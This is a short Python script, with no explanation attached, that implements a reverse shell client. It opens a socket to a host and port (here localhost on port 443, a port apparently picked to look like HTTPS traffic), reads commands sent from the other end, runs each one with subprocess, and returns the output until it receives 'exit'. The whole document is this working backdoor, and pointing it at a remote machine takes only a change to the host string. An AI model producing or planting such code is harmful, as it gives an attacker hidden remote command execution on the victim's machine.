import os
import socket
import subprocess

s = socket.socket()
host = '127.0.0.1' 
port = 443

s.connect((host, port))

while True:
    command = s.recv(1024).decode('utf-8')
    if command.lower() == 'exit':
        break
    else:
        output = subprocess.getoutput(command)
        s.send(output.encode('utf-8'))

s.close()